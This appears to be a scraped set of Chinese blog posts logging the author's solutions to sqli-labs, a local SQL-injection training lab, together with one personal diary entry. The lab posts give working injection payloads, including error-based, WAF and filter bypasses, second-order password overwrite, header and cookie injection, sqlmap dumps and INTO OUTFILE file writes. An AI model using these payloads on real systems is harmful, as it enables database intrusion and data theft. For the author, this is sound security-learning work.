\u0026#34;.:/var/www/html\u0026#34;- \u0026#34;./etc/apache_default:/etc/apache2/sites-available/000-default.conf\u0026#34;- \u0026#34;./etc/htaccess:/var/www/html/.htaccess\u0026#34;environment:DB_HOST:\u0026#34;db\u0026#34;DB_PASS:\u0026#34;toor\u0026#34;links:- db:dbwaf:depends_on:- dbimage:\u0026#39;tomcat:jre8-openjdk-bullseye\u0026#39;volumes:- \u0026#34;./WAF/sqli-labs:/usr/local/tomcat/webapps\u0026#34;- \u0026#34;./mysql-connector-java.jar:/usr/local/tomcat/lib/mysql-connector-java.jar\u0026#34;links:- db:db- web:web  添加waf和reverseproxy，waf用tomcat官方容器不需要配置，但源码index.jsp里请求地址要改。还要从 MySQL 官网单独下载一个 mysql-connector-java 的 jar 包挂载进去。\nreverseproxy 用 nginx:mainline，简单配一下反代规则。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  upstream lab { server web; } upstream tomcat { server waf:8080; } server { listen 80; listen [::]:80; server_name localhost; location / { proxy_pass http://lab; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; } location ~ ^/Less-(29|30|31|32)[a-zA-Z]?/ { proxy_pass http://tomcat; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; } }   到这一步就应该能同时访问 WAF 和其他题目了。\n重新解题 审阅下WAF代码。\n1 2 3 4 5 6 7 8 9  \u0026lt;% // ... 略 String rex = \u0026#34;^\\\\d+$\u0026#34;; Boolean match = id.matches(rex); if(match==true) { // ... 请求 web 服务 } else { response.sendRedirect(\u0026#34;hacked.jsp\u0026#34;); }   看起来无懈可击，正则匹配整个id参数必须是纯数字。再看下 Less-29 原题代码，select * from users where id='$id' limit 0,1，好了这题我确实不懂了，知识盲区。看别的大佬的题解：\n 问：index.php?id=1\u0026amp;id=2，这时回显是id=1还是id=2呢？\n**答：**apache (php) 解析最后一个参数，即回显id=2；tomcat (jsp) 解析第 一个参数，即回显id=1。\n作者：Hyafinthus 链接：https://www.jianshu.com/p/46cb6c354de5\n 这是一个利用 apache+php 和 tomcat+jsp 对重名 query string 参数解析结果的绕过。我们尝试下 ?id=1\u0026amp;id=2'，成功绕过。\n剩下就不多谈了，把注入的 payload 放到第二个参数里就可以绕过 WAF 的防御。\n最后补充一点如何判断服务器类型。一个主要的办法就是看 HTTP 响应里的 Server 头——但一般多个服务器后端的情况下，更可能出现的是一个大反代服务去代理其他所有服务，根据 url 来匹配转发。这种情况下 Server 头一般就固定是反代服务器了。在这题里是nginx/1.21.6，我们看不到apache和tomcat。\n另一种方法是靠经验判断=。=一般来说，写 php 的喜欢配 apache 或者 nginx，写 jsp 的会优先考虑java的容器比如tomcat。写 go 的一般裸奔或者配个 nginx 反代，Python 就可能是 uwsgi 或者别的实现 WSGI 协议的服务器或者裸奔，现在也可能有 ASGI 的服务器。这些只能靠对后端生态的了解来猜测了。如果是前后端分离架构的话，后端开发语言和环境的特征就更难找了。\nLess-30 WAF，无错误回显，有正确回显，字符型注入双引号。\n可以考虑用 union select 解决，WAF 绕过方法和 Less-29 一样。\nLess-31 和 Less-30 一样。 WTF ？看了眼源码发现就多了一个右括号。\n总结 时间有限，还得抓紧开始看自考的课程。今天就先这样意思意思，没别的意思。\nsqli-labs 的 WAF 感觉怪怪的，不像是之前见过的 php 的 WAF，绕过的思路感觉还是比较有趣的，反代形式的WAF如果不注意可能会被这个问题坑到。\n28题审阅源码才发现过滤方法有漏洞，测 SQL 注入问题的时候还得多准备点各种 payload。我感觉是有很大自动测的空间，可以自己写个测试脚本啥的，但 sqlmap 珠玉在前=。= 或许有机会看看 sqlmap 源码会有更多启发。\n今天就这样，辛苦我自己啦。\n","date":"2022-05-13T15:04:43+08:00","permalink":"https://nnnewb.github.io/blog/p/sqli-labs-training-5/","title":"sqli-labs 实验记录 #5"},{"content":"前言 惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。\nLess-23 提示 error based, no comments。所以应该是屏蔽了 --、#和/**/，所以注入要看SQL注入位置的后半句SQL怎么写的了。\n尝试用 extractvalue 攻击发现不行。\n1  ?id=1\u0026#39; and extractvalue(1,concat(\u0026#39;~\u0026#39;,password)) or \u0026#39;1\u0026#39;=\u0026#39;1   错误：Only constant XPATH queries are supported，updatexml也是一样。换成 group by 法攻击（仅限 MySQL \u0026lt; 5.7.36）。注入1'确认后面跟着的是LIMIT 0,1。\n手工调试出一个预期的SQL：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  select*from-- 从 1\u0026#39; and 开始承接原查询 id=\u0026#39;1\u0026#39;and(select123-- 子查询包装，把子查询确保 payload 不影响原查询。 from(selectcount(*),concat((selectconcat(username,\u0026#39;~\u0026#39;,password)fromuserslimit0,1),-- 拼接如 username~password 的字符串，limit 避免子查询返回多行出错，也可枚举所有行。目的都是确保能触发 duplicate entry \u0026#39;~\u0026#39;,floor(rand(14)*2))xfrom(select1unionallselect2)-- 构造个临时表，两行就够 groupbyx-- 在这里触发 duplicate entry 错误 )x-- 避免 Every derived table must have its own alias 错误 )and\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- 承接原查询的单引号，后面就是原查询的剩余部分了。 limit0,1;  提取 Payload：\n1  ?id=1\u0026#39; and (select 123 from (select count(*),concat((select concat(username,\u0026#39;~\u0026#39;,password) from users limit 0,1),\u0026#39;~\u0026#39;,floor(rand(14)*2)) x from (select 1 union all select 2) as t group by x) x) and \u0026#39;1\u0026#39;=\u0026#39;1   成功\nLess-24 提示 second degree injections ，但谷歌没有找到这个说法，但有另一个说法叫 second-order injection。摘自 portswigger：\n Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.\n 再看页面：\n分别有注册和登陆两个位置，从 second-order injection 的描述来看，如果存在于 Less-24 的话，可能的情况就是在注册接口允许特殊字符比如 admin' or 1=1 作为用户名。\n首先尝试了注册正常用户 test123 并登陆，但登录后跳转login.php却没有内容。看来没有更多提示了。\n再注册用户 test123'\u0026quot;并登陆，跳转login.php 依然没有内容。这就不懂了，没辙，审下源码。\n注册：\n立刻注意到mysql_escape_string，可能存在宽字符注入的问题，但和 second-order injection 好像搭不上关系，继续往下看。\n并无特别之处。继续看登陆。\n发现问题了。登陆成功应该设置 Auth 这个 cookie 但我没找到。Location 这个 HTTP 头也没有出现在响应里。这肯定不是正常的挑战，不审阅代码根本看不到这有个 Auth cookie 要设置，还有登陆成功后跳转的位置是 logged-in.php。\n看起来是 sqli-labs 自己的 bug。页面上有几个 PHP 的警告：\n尝试修复。\n 把Less-24/login.php的\u0026lt;?php标签放到最前，html改成echo \u0026lt;\u0026lt;\u0026lt;END heredoc 形式，放到登陆失败的 else 分支里。 把sql-connections/sql-connect.php的?\u0026gt;删除 把sql-connections/db-creds.inc的?\u0026gt;删除  这和 php 如何发起 HTTP 响应有关系，HTTP 头只能出现在 body 前，如果解释器先遇到了 HTML 或者别的输出语句，那写 body 之前肯定是先把 header 给写完了。开始输出 body 部分后再调用 setcookie 或 header 就已经太迟了，HTTP 头已经发给客户端了。\n修复后成功进入登录后界面，是个修改密码的表单。审代码前盲猜是直接用了 $_SESSION['username'] 而没转义导致 second-order injection。\n猜对了。\n接着用test123'这个账号登陆试试，触发报错：\n这里形成的是一个 update 注入，所以注册一个用户名为 test123' or username='admin 的用户即可修改 admin 的密码。\nLess-25 提示 all your \u0026lsquo;OR\u0026rsquo; and \u0026lsquo;AND\u0026rsquo; belongs to us，服务端过滤了 AND 和 OR 两个关键词，但 UNION ALL 还能用。尝试 ?id=0' union all select 1,username,3 from users where '1'='1 成功。但 password 里的 or 也被过滤了。注意页面底部有个 hint 提示过滤后的文本是什么样。\n尝试双写 bypass ?id=0' union all select 1,username,passwoorrd from users where '1'='1\n成功。\nLess-26 提示 all your spaces and comments belongs to us，空格和注释会被过滤。\n ?id=1';--%20，发现--被过滤 ?id=1';%23，发现#被过滤 ?id=1';/*，发现/*被过滤。  三种注释符都被过滤了，尝试双写绕过。?id=1';//** 依然被过滤。这就蛋疼了。审一下代码吧。\n这些字符都被替换了/*-#\\s\\\\。经过谷歌发现一个绕过的方法，尝试用 ASCII 码表中的特殊空白符绕过。\n参考：Sqli-Labs：Less 26 - Less 26a\n先测一遍这些特殊字符：\n1 2 3  \u0026lt;?php echo preg_replace(\u0026#39;/\\s/\u0026#39;,\u0026#39;@\u0026#39;,\u0026#34;1\\x092\\x0a3\\x0c4\\x0b5\\x0d6\\xa0\u0026#34;);   发现只有\\xa0没有匹配到\\s这个正则，接着尝试 union 注入，用%a0替代%20。可以写个脚本把%00到%ff都试一遍看看哪些字符可用。\n\\xa0不在 ascii 码表内，latin1编码中表示non breaking space。\n1  ?id=0\u0026#39;%a0UNION%a0ALL%a0SELECT%a01,2,3%a0FROM%a0users%a0WHERE%a0\u0026#39;1\u0026#39;=\u0026#39;1   注入成功。\n另外补充一下关于 AND OR 的绕过方法，使用 preg_replace 替换的话双写就无法绕过了，但还可以考虑用逻辑运算，\u0026amp;\u0026amp;、||以及位运算|、\u0026amp;去组合条件，甚至是算数运算select * from users where (id=1)+(username='Dumb')=2;。\n以上就是空格和and、or过滤的绕过方法了。注释感觉没法绕，现在没思路，暂且不谈。\nLess-27 提示 all your union and select belongs to us ，不能使用 union 注入。测试注入?id=1'报错有回显，字符型注入。考虑限制了 select 查别的表会比较麻烦，先试试能不能绕过 ?id=1' uniunionon seselectlect 1,2,3\n发现union成功绕过，但select没有幸免，同时发现空格也被过滤了。修改 payload ?id=1'%a0uniunionon%a0SeselectLeCt%a01,2,3 成功大小写绕过。\n之后就是常规操作了 ?id=0'%a0uniunionon%a0SeselectLeCt%a01,2,3%a0from%a0users%a0where%a0'a'='a，成功。\n总结 page-2 难度果然比 page-1 大很多，今天只做出来5道题，每题都要想一会儿查查资料。\n几个意识到的知识点：\n 直接拼接某些函数有问题，或者拼子查询有问题，可以考虑下用select 123 from (select ...)包装一下说不定能省很多事。 second-order injection 的概念，用户输入可能过滤很好，但另一个地方用的时候没过滤，也会造成注入。 几种绕过过滤的方法  对and、or用运算符替代的方式绕过。但有经验的开发会屏蔽掉|\u0026amp;;$之类的特殊字符，不一定好绕。 对空格过滤的绕过，latin1编码的空格0xa0。一般开发不容易注意到0xa0能绕过\\s正则。 一般关键词用双写、大小写方式绕过，但不一定绕得过去，被禁用的情况下可以考虑下换别的方式。    再补充下如何安全开发。其实很简单，用 parameterized query 或者说 prepared statement/query 。目前是最有效的防 SQL 注入的方法，彻底摆脱了上面的过滤、转义等传统攻防对抗，web App 开发者可以从 SQL 注入漏洞的无底深渊里解放出来。\n遗憾的是我随便翻了下 github 上的一些新 CMS，虽然有各种 ORM 可以用，现代 DBMS 也早支持了 parameterized query，但还有人在手动拼 SQL =。= 理由就不乱推测了。Go 的 sql 库还是很给力的，直接把 parameterized query 作为最佳实践了，就是还顶不住依然有人在拼字符串=。= 我也是大无语。\n那就到这里结束了，辛苦我自己啦！\n","date":"2022-05-12T17:23:32+08:00","permalink":"https://nnnewb.github.io/blog/p/sqli-labs-training-4/","title":"sqli-labs 实验记录 #4"},{"content":"胡言乱语几句。\n先分享一个比较开心的事情，下狠心拿一个月工资报了个机构自考本科，目标是把学位证也拿下，最好还能混到奖学金。顺便申请了继续教育退税，虽然退不了多少。也不指望还能靠这些把学费赚回来。\n嗯，就是这样啦。\n原本的想法是考个 CISP 之类的证（注意到培训价格也是8k+，而且是强制培训。CISP-PTE 更是快 2w。），后来因为同事报了个自考，想想这个价完全可以先把自考拿下，学历比这几个技能证有用多了，至少以后投简历不会那么轻易被筛掉了。\n惨。为了能有个和别人公平竞争的机会真的是又烧钱又费时间。这种时候才会后悔自己当初怎么就会有学历就是个敲门砖的傻卵想法，就算是砖也不是遍地都能捡的啊。还好学了点手艺才能混到现在，年收入还够不到个税自主申报线。想想自己四五年工作经历只感觉自己就是个傻卵废物。\n发泄完还得继续生活。\n看了下自考科目感觉有几门还是比较容易过的，数学几门还是有点发憷。不过今年好像没有考数学，复习时间应该是够长的。\n除了自考还打算考虑下软考或者安全方向的证，趁现在工作比较清闲充电，期望在30岁前能赚到税后年入接近20w吧，也不奢求超过这个数了，有个十七八都好。\n说到年龄，还有点比较烦心的事情。过了30想再解决终身大事恐怕就有点难了，烦，烦，烦。\n就这样吧，胡言乱语水了一篇博客。\n","date":"2022-05-12T10:33:08+08:00","permalink":"https://nnnewb.github.io/blog/p/2022-5-12-one-small-thing/","title":"2022年5月12日 一件小事"},{"content":"前言 从 sqli-labs 第 11 题开始。后续注入点不再是 query string，还是先拿 sqlmap 解决。题目数量很多区别较小，所以重复的思路可能就略了。\nLess-11 Error Based 而且注入点是 POST 表单。用'确认password字段也有注入后，尝试手工 bypass 验证：' or 1=1;-- 注意注释符后跟一个空格，但不能在输入框写 %20，会被转义成%%20。\nLess-12 用\u0026quot;测出引号类型后根据报错内容补一个右括号，最终 payload \u0026quot;) or 1=1;-- 注意空格。\nLess-13 有报错，提示 double injection 。用'测出引号类型，根据错误信息补右括号，') or 1=1;-- bypass 成功。\n也可以用上一篇博客提到的rand+group by报错的方式。但我是真的越来越不懂 double injection 到底是不是特指某种注入技巧了，还是说就没共识大家对 double injection 各自解释？\nLess-14 用\u0026quot;测出引号类型，根据报错不用补右括号，\u0026quot; or 1=1;-- bypass 成功。\nLess-15 布尔盲注，测试'报错，' or 1=1;-- bypass 成功。\n图就略了。\nLess-16 时间盲注，测试\u0026quot;报错，\u0026quot; or sleep(1);--无效，补右括号，\u0026quot;) or sleep(1);-- 有效。\nLess-17 这次的表单是更新密码，表单内容用户名和新密码，没有错误回显。\n提示 update 注入。update 注入的 SQL 格式化参数的位置一般在 UPDATE tbl SET col=input col2=input ... WHERE ... SET 后面和 WHERE 后面。这里显然 WHERE 后面的是用户名 SET 后面的是新密码。因为没有明确的目标，越权把 admin 用户的密码改了拉倒。\n先确认注入类型，尝试 admin';-- 、admin');-- 、admin\u0026quot;;-- 、admin\u0026quot;);-- 、admin'));--、admin\u0026quot;));--都无效。这就有点气人了。\n再试试密码能不能注入，password';--，直接把后面的where全注释掉。\n直连 MySQL 验证确认注入生效。\n另外也可以用 error based 方式在密码这里注入，爆出 admin 的密码，子查询就行。\nLess-18 提示 Header Injection，尝试正常密码登陆 admin、password 成功。\n界面上分别是 IP 地址和 UA，没有更多提示，也没找到自定义 HTTP 头，所以初步怀疑注入点是在 UA 里。可以选择用 httpie 或者 curl 发个请求测试。我用 httpie 试下。\n1  http --form POST \u0026#39;http://localhost/Less-18/\u0026#39; uname=admin passwd=password submit=Submit \u0026#34;User-Agent:sqli/1.0\u0026#39;\u0026#34;   返回\n1  \u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;Your User Agent is: sqli/1.0\u0026#39;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;172.19.0.1\u0026#39;, \u0026#39;admin\u0026#39;)\u0026#39; at line 1\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;   确认存在注入。剩下的事情就很简单了，写个 req.txt 用 sqlmap -r req.txt -p User-Agent -T users --dump爆出用户名密码。\nLess-19 依然是 Header Injection，提示 Your Referer is ...，注入点应该在 Referer 里，直接把 Less-18 的命令稍微改下。\n1  http --form POST \u0026#39;http://localhost/Less-19/\u0026#39; uname=admin passwd=password submit=Submit \u0026#34;Referer:http://im.hacker/\u0026#39;\u0026#34;   返回\n1  \u0026lt;br\u0026gt;Your IP ADDRESS is: 172.19.0.1\u0026lt;br\u0026gt;\u0026lt;font color= \u0026#34;#FFFF00\u0026#34; font size = 3 \u0026gt;\u0026lt;/font\u0026gt;\u0026lt;font color= \u0026#34;#0000ff\u0026#34; font size = 3 \u0026gt;Your Referer is: http://im.hacker/\u0026#39;\u0026lt;/font\u0026gt;\u0026lt;br\u0026gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;172.19.0.1\u0026#39;)\u0026#39; at line 1\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;img src=\u0026#34;../images/flag.jpg\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;   确认注入ok，接着用 sqlmap 就行。\nLess-20 提示 Cookie Injection，但是无论登陆成功失败都没有设置 Cookie。尝试随便设置一个 cookie id=...，再刷新页面，并无效果，于是开始怀疑是不是说的 PHPSESSID，再次尝试PHPSESSID=1'\u0026quot;，依然没有作用。发愁。\n看了眼 Less-20 的源码，发现代码里明确写了 !isset($_COOKIE['uname'])，再试一次uname=admin'。\n有效果，问题变成了如何完成注入。审阅源码得知只有满足 isset($_COOKIE['uname']) 和 !isset($_POST['submit']) 的情况下才会进入带查询的分支。所以只需要在这个页面不用ctrl+r（因为会重新POST表单），点地址栏再回车就进入了带查询的页面。\n可以看到下方有MySQL的错误信息，接下来只需要用 sqlmap 或者手工构造个 error based 爆破即可。\nLess-21 依然是 Cookie 注入，但是是 complex 版本，我倒要看看有多复杂。直接上 Less-20 的 uname=admin'。\n注意有个特殊的错误信息。\n1  Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation \u0026#39;=\u0026#39;   谷歌搜索可知这是因为查询的字符集有差异，尝试比较gbk_chinese_ci和latin1。这里我们了解下gbk是宽字符集，定长 2 字节，而 latin1 是一个极为特殊的字符集，ascii包括了u+0001~u+0080，latin1正好包括了u+0080~u+00ff，也就是单字节除了0x00外全部都可以解释成 ascii 和 latin1 而不出现编码错误，经常被当成默认字符编码。\n回到正题，测试中发现'没有报错，所以继续尝试\u0026quot;，依然没报错，问题变得奇怪起来了。直接开始审阅代码。\n发现有个 base64_decode，把 payload 编码一下：YWRtaW4nCg\n报错成功。接下来手工构造一个 error based 注入或者 sqlmap 加上 base64 tamper 即可。\nLess-22 21和22两题都没法从前端得到太多信息，还是直接看代码。\n一个 base64_decode 加上 \u0026quot;\u0026quot; 连接，我们编码一下 payload：YWRtaW4iCg\n报错成功，接下来手工构造 error based 注入或者 sqlmap 都行，不重复了。\n总结 至此，整个 sqli-labs page-1 的所有题目就都做完了。\n自我感觉 sqli 的基础应该是掌握差不多了，也有了信心和耐心。考虑接下来是做 page-2 还是找 xss-labs ，打打 xss 的基础。或者一起来也行，预计 page-2 可能会稍难点，大概，做不过就试试 xss-labs。\n","date":"2022-05-11T16:36:31+08:00","permalink":"https://nnnewb.github.io/blog/p/sqli-labs-training-3/","title":"sqli-labs 实验记录 #3"},{"content":"前言 开始 sqli-labs 的第二轮训练。\n !!!ATTENTION!!!\n在 MySQL 5.7.36 更新中，修复了 group by 报错 Duplicate entry '0' for key '\u0026lt;group_key\u0026gt;' 的问题。\n Changes in MySQL 5.7.36 (2021-10-19, General Availability)\nWhen a query uses a temporary table for aggregation, the group by item is used as a unique constraint on the temporary table: If the item value is already present, the row is updated; otherwise, a new row is inserted into the temporary table. If the item has a result field or reference item, it it evaluated twice, once to check whether the result exists in the temporary table and, if not, again while constructing the row to be inserted. When the group by item was nondeterministic, the result value used to check for existence differed from that with which an insert was attempted, causing the insert to be rejected if the value already existed in the table.\nWe fix this by using the hash of any nondeterministic items as the unique constraint, so that the hash is evaluated once only. (Bug #32552332)\n 使用的 MySQL 版本 \u0026gt;=5.7.36 时，Less 5 和 Less 6 使用的 select count(*), concat(version(), '~', floor(rand(14)*2)) x from user group by x; 不会再报错。这个利用被彻底堵死了。\n Less-5 Error-Based Double Query 原理 有一篇很好的文章解释了这里的 Double Injection 指的是什么。我尽量概括一下。\n先忽略 Double Injection 这个不明所以的名字，它代表技术原理的是利用 group by \u0026lt;col\u0026gt; 产生临时表，col 在临时表有唯一性约束，而 MySQL 在违反唯一性约束的错误信息里会提示违反唯一性的col内容是什么，由此产生信息泄露。\n以一个案例来解释。下面的查询里version()是想爆的列，concat(...)连接目标列和随机数序列构造一个尽可能快出现冲突的group key。floor(rand(14)*2)产生的序列前四个结果是1,0,1,0，插入过程会产生两个rand调用（一次检查是否存在，一次插入新行），所以可以看成第一次查询1不存在，插入0；第二次查询1不存在，插入0，报错违反唯一性约束。\n1  selectcount(*),concat(version(),\u0026#39;~\u0026#39;,floor(rand(14)*2))xfromtestgroupbyx;  其中一个比较有趣的点是为什么要用rand，能不能写一个固定值？\n1  selectcount(*),concat(version(),\u0026#39;~\u0026#39;,\u0026#39;hello\u0026#39;)xfromtestgroupbyx;  不行，这样做等于group by常量或者一个列，和普通group by没区别。rand发挥的关键作用是扰乱插入更新/插入临时表的过程。这个过程可以理解成这样：\n1 2 3  if !update(group_key, tally+1) { insert(group_key, 1) }   不使用rand时update和insert接收的就是同一个group_key，使用rand后update和insert就可能用的不是同一个group_key了，导致进入insert时插入的是已存在的group_key。\n另一个有趣的问题是为什么要有count(*)？去掉count(*)就会导致不再报错。\n等大佬解释。\n题解 ?id=1' union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20\n Attention： MySQL版本 \u0026gt;=5.7.36 这个解法彻底失效。目前搜索 Double Injection 只有这一个解，如果有别的思路务必告知我。\n Less-6 Error-Based Double Query 和 Less-5 的区别只在于从单引号换成了双引号。稍微改一改 payload：?id=1\u0026quot; union select null,concat(version(),'~',floor(rand(14)*2))x,count(*) from users group by x; --%20\nLess-7 Dump into Outfile  **注意：**这题不要求 Error-Based 了，请注意。\n 原理 简而言之，两个方面：\n 利用 MySQL 的 select ... into outfile|dumpfile \u0026lt;filepath\u0026gt; 语法把查询结果保存到文件。 利用 MySQL 的 LOAD DATA 和 LOAD XML 语句读出任意文件内容。  第一点可以用作覆盖磁盘上任意文件，通过 SQL 注入实现写入 webshell 或 crontab 等恶意行为。\n第二点可以从 SQL 注入扩展到任意文件读取，MySQL 权限足够情况下可以拿到很多敏感文件内容。\n题解 本题没有回显，虽然可以按盲注爆破，但题目提示是使用 outfile。所以最简单的解法就是两步走。\n 注入 SELECT ... INTO DUMPFILE 导出结果到文件。 注入 LOAD DATA 进而拿到结果。  先确认注入类型：\n ?id=1 and 1=0;--%20 无效 ?id=1' and 1=0;--%20 报错 ?id=1\u0026quot; and 1=0;--%20 无效  所以是字符型注入，但SQL语句未知，尝试补括号：?id=1') and 1=1;--%20，依然报错，补两个括号后发现变正常：?id=1')) and 1=1;--%20。完成注入类型确认。\n接着把and条件去掉，改成into outfile '/var/www/html/dump.txt'，完整 payload：?id=1')) into outfile '/var/www/html/dump.txt';--%20\n **注意：**docker方式部署请注意，MySQL 镜像默认启用了 --secure-file-priv 选项，这个选项会禁用 select .. into outfile|dumpfile，使注入的SQL执行失败。\n**注意：**docker-compose 方式部署的 sqli-labs 如果把 MySQL 和 PHP+Apache 分开部署，即使select ... into outfile ... 成功，也无法直接通过 HTTP 方式下载，这一利用也无法继续下去。\n 上述注入如果成功的话可以直接访问 http://localhost:8080/dump.txt 下载到查询结果了。\nLess-8 Blind Boolian 题目是布尔盲注。确认 SQL 注入类型：?id=1' and 1=1;--%20。\n典型的盲注，不自己动手了，接下来直接上 sqlmap。\n1  sqlmap -u \u0026#39;http://localhost/Less-8/?id=1\u0026#39; --technique B -p id -T users --dump   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Database: security Table: users [13 entries] +------+----------+------------+ | id | username | password | +------+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +------+----------+------------+   done。\nLess-9 Blind Time-Based 基于时间的盲注，先测试注入类型：?id=1' and sleep(1);--%20\n确认注入类型成功。接着还是上 sqlmap。\n1  sqlmap -u \u0026#39;http://localhost/Less-9/?id=1\u0026#39; --technique T -p id -T users --dump --count 1   基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。\nLess-10 Blind Time-Based DoubleQuotes 和 Less-9 一样，换成了双引号。sqlmap需要加上--level 2参数，让 sqlmap 更努力一点。\n总结 两个知识点一个教训。\n知识点：\n rand结合group by实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。 select ... into outfile|dumpfile和load data。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。  教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。\n虽然啥也没干还是辛苦我自己了。\n","date":"2022-05-10T15:14:45+08:00","permalink":"https://nnnewb.github.io/blog/p/sqli-labs-training-2/","title":"sqli-labs 实验记录 #2"},{"content":"前言 sqli-labs 是一个开源的 SQL 注入学习平台，最近更新已经是 2014 年了，也是个老项目。不过 sqli-labs 提供的靶场更大，包含 4 个难度级别，每个难度十几题，总共 65 题。\n感觉会比 dvwa 难一大截，用来学 SQL 注入的玩法肯定是绰绰有余了。\n本篇应该是 sqli-labs Basic Challenges 系列 WP 的开始。\n环境搭建 部署方案 两种部署方式，一种是在虚拟机里安装 LAMP 环境（包管理或者别的什么一键安装都行），另一种就是 docker 容器化。显然容器化对靶场玩家更友好。所以我选择容器环境。\n这里使用了一个原 sqli-labs 的分支，aljavier/sqli-labs，省下自己写 docker-compose 和 dockerfile 找环境适配的时间。未来发现配置有问题再自己改改。\n虚拟机环境准备 虚拟机系统选 Ubuntu 或者 Debian ，或者随你喜欢。安装 docker 和 docker-compose，具体步骤自己看文档。\n可能还有些需要准备的东西，如果宿主机上没有的话可以考虑在虚拟机里安装，比如 sqlmap ，还有需要命令行直连 MySQL 的话可以再装个 mycli。其他就是些个人偏好的开发环境，用来写打靶的小工具小脚本什么的。vim 配置 ohmyzsh 这些就不用提了。\n部署启动 1 2 3  git clone https://ghproxy.com/github.com/aljavier/sqli-labs cd sqli-labs docker-compose up -d   我额外干了点可能没必要的事情，因为注意到 index.html、readme.md 之类很多文件都有 x 权限位，这可能是因为在 Windows 上用 Git 提交导致的权限错误，所以我顺便 find . -executable -type f -name '*.html' | xargs -I{} chmod -x 把权限清理了一下。带x权限的文件比较多也不只是html，总之最后是全都去掉了x权限。\n之所以说没必要是可能影响之后的注入利用，总之这一步随意。\n初探 总览 UI设计有点拉。左上角是切换不同难度和重置数据库，可以看到除了 Page-1(Basic Challenges) 还有 3 个难度。\n下面的脑图就是这个难度下的 关卡 了。\nLess-1 Error-Based string 随意打开第一题。\n提示输入数字ID作为参数，提示有点模糊，正确做法是在URL里添加?id=1这样的 query string。上一页有明确提示 single quotes，这里给一个'就会报错：\n但奇妙的是这里看似是数字型注入，给?id=1 and 1=1正确返回。但如果多测一下?id=1 and 1=0就会发现依然是正确返回，所以造成这一结果应该是 php 5.x 的字符串转数字中丢掉了后面的and 1=1。\n所以按字符型注入处理即可。确定要补'之后就可以继续了。这题主题是 Error Based，所以我们构造一个 Error Based 注入。?id=1' and extractvalue(1,concat('~',version())) -- 。注意--后的空格，浏览器会自动删掉URL前后的空格字符，可以手动在末尾补一个URL编码的空格符%20。\n到这就完成了利用。\nLess-2 Error-Based Intiger 应该是想写 Integer。\n初始提示一样，尝试?id=1 and 1=1和?id=1 and 1=0之后发现存在注入，提示 Error-Based，选择和上一题同样的 Payload 去掉'可破。\nLess-3 Error-Based Single-quotes with twist 一样的提示。\n但这题有点不一样的地方，尝试?id=1' and 1=1 --%20会发现依然报 SQL 语法错误。\n试了下?id=1; -- %20。\n没辙了，看一眼参考答案（源码）。\n所以是我少给了个)。这时候才后知后觉发现语法错误报错里已经有提示了，near '; -- ') LIMIT 0,1，这里有个右半括号。\n所以把第一题的 payload 改一下，?id=1') and extractvalue(1,concat('~',version())) --%20\n这关就算 pass 了。\n教训是不要忽视细节。\nLess-4 Error-Based Double Quotes 提示 DoubleQuotes，MySQL 的字符串可以用双引号 \u0026quot;，这里试一下 Payload ?id=1\u0026quot; and 1=0。\n发现有错误，从错误信息来看有个\u0026quot;)，我们稍微改下 paylaod 再加上注释符：?id=1\u0026quot;) and 1=0; --%20\n成功，现在还是用 extractvalue 提取信息：?id=1\u0026quot;) and extractvalue(1,concat('~',version())); --%20\n成功。\n总结 吸收的教训还是两个字，细心。\n另外还有个关于 payload 的问题。error-based injection 需要错误回显里给出参数字段的值，满足这个条件的函数不多，我只知道 updatexml 和extractvalue是肯定ok的，前一篇 red tiger 的打靶笔记里记录了另外两种方法（BIGINT UNSIGNED溢出和ST_LongFromGeoHash，溢出法在 5.7好像不行了）但少有用起来。\n在使用 extractvalue 这个 payload 过程里会有疑问，为什么要有一个concat('~', version()) 而不是直接 extractvalue(1,version())？其实实测一下就会发现 dump 出来的数据不完整或者干脆不报错。原因也很简单，extractvalue是个xml函数，第二个参数是xpath。xpath的语法正好会允许很多格式的数据，比如单纯整数或单词，当成合法的xpath表达式。\n比如上面的 Less-4 ，用 ?id=1\u0026quot;) and extractvalue(1,database()); --%20这个payload会发现页面不报错，因为database()返回的security正好可以当成xpath表达式被识别，虽然没从第一个参数里提取出任何东西，但也没触发MySQL错误，也就拿不到第二参数的内容了。\n看似没用的concat('~', 